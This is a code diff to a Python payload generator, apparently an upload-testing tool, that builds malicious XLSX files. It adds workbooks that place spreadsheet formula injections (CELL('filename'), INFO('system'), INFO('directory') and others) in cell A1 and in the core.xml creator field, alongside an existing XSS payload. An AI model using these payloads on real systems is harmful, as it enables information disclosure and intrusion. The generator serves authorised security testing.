@@ -17,6 +17,8 @@ def generate_xlsx_payloads(output_dir, burp_collab):
     xxe_dir.mkdir(exist_ok=True)
     xss_dir = output_dir / 'xss'
     xss_dir.mkdir(exist_ok=True)
+    info_dir = output_dir / 'info'
+    info_dir.mkdir(exist_ok=True)
     
     wb = Workbook()
     ws = wb.active
@@ -152,6 +154,161 @@ def generate_xlsx_payloads(output_dir, burp_collab):
             if t is not None:
                 t.text = '<svg onload=alert(1)>'
         tree.write(sharedstrings_path, encoding='utf-8', xml_declaration=True)
+    
+    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+        for file_path in temp_dir.rglob('*'):
+            if file_path.is_file():
+                arcname = file_path.relative_to(temp_dir)
+                zip_ref.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    wb = Workbook()
+    ws = wb.active
+    ws['A1'] = '=CELL("filename")'
+    xlsx_path = info_dir / "info1_cell_filename.xlsx"
+    wb.save(xlsx_path)
+    
+    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+        temp_dir = output_dir / "temp_info1"
+        zip_ref.extractall(temp_dir)
+    
+    core_path = temp_dir / "docProps" / "core.xml"
+    if core_path.exists():
+        tree = ET.parse(core_path)
+        root = tree.getroot()
+        ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
+        creator = root.find('.//dc:creator', ns)
+        if creator is not None:
+            creator.text = '=CELL("filename")'
+        else:
+            creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
+            creator.text = '=CELL("filename")'
+        tree.write(core_path, encoding='utf-8', xml_declaration=True)
+    
+    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+        for file_path in temp_dir.rglob('*'):
+            if file_path.is_file():
+                arcname = file_path.relative_to(temp_dir)
+                zip_ref.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    wb = Workbook()
+    ws = wb.active
+    ws['A1'] = '=INFO("version")'
+    xlsx_path = info_dir / "info2_info_version.xlsx"
+    wb.save(xlsx_path)
+    
+    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+        temp_dir = output_dir / "temp_info2"
+        zip_ref.extractall(temp_dir)
+    
+    core_path = temp_dir / "docProps" / "core.xml"
+    if core_path.exists():
+        tree = ET.parse(core_path)
+        root = tree.getroot()
+        ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
+        creator = root.find('.//dc:creator', ns)
+        if creator is not None:
+            creator.text = '=INFO("version")'
+        else:
+            creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
+            creator.text = '=INFO("version")'
+        tree.write(core_path, encoding='utf-8', xml_declaration=True)
+    
+    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+        for file_path in temp_dir.rglob('*'):
+            if file_path.is_file():
+                arcname = file_path.relative_to(temp_dir)
+                zip_ref.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    wb = Workbook()
+    ws = wb.active
+    ws['A1'] = '=INFO("system")'
+    xlsx_path = info_dir / "info3_info_system.xlsx"
+    wb.save(xlsx_path)
+    
+    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+        temp_dir = output_dir / "temp_info3"
+        zip_ref.extractall(temp_dir)
+    
+    core_path = temp_dir / "docProps" / "core.xml"
+    if core_path.exists():
+        tree = ET.parse(core_path)
+        root = tree.getroot()
+        ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
+        creator = root.find('.//dc:creator', ns)
+        if creator is not None:
+            creator.text = '=INFO("system")'
+        else:
+            creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
+            creator.text = '=INFO("system")'
+        tree.write(core_path, encoding='utf-8', xml_declaration=True)
+    
+    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+        for file_path in temp_dir.rglob('*'):
+            if file_path.is_file():
+                arcname = file_path.relative_to(temp_dir)
+                zip_ref.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    wb = Workbook()
+    ws = wb.active
+    ws['A1'] = '=NOW()'
+    xlsx_path = info_dir / "info4_now.xlsx"
+    wb.save(xlsx_path)
+    
+    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+        temp_dir = output_dir / "temp_info4"
+        zip_ref.extractall(temp_dir)
+    
+    core_path = temp_dir / "docProps" / "core.xml"
+    if core_path.exists():
+        tree = ET.parse(core_path)
+        root = tree.getroot()
+        ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
+        creator = root.find('.//dc:creator', ns)
+        if creator is not None:
+            creator.text = '=NOW()'
+        else:
+            creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
+            creator.text = '=NOW()'
+        tree.write(core_path, encoding='utf-8', xml_declaration=True)
+    
+    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+        for file_path in temp_dir.rglob('*'):
+            if file_path.is_file():
+                arcname = file_path.relative_to(temp_dir)
+                zip_ref.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    wb = Workbook()
+    ws = wb.active
+    ws['A1'] = '=INFO("directory")'
+    xlsx_path = info_dir / "info5_info_directory.xlsx"
+    wb.save(xlsx_path)
+    
+    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+        temp_dir = output_dir / "temp_info5"
+        zip_ref.extractall(temp_dir)
+    
+    core_path = temp_dir / "docProps" / "core.xml"
+    if core_path.exists():
+        tree = ET.parse(core_path)
+        root = tree.getroot()
+        ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
+        creator = root.find('.//dc:creator', ns)
+        if creator is not None:
+            creator.text = '=INFO("directory")'
+        else:
+            creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
+            creator.text = '=INFO("directory")'
+        tree.write(core_path, encoding='utf-8', xml_declaration=True)
     
     with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
         for file_path in temp_dir.rglob('*'):
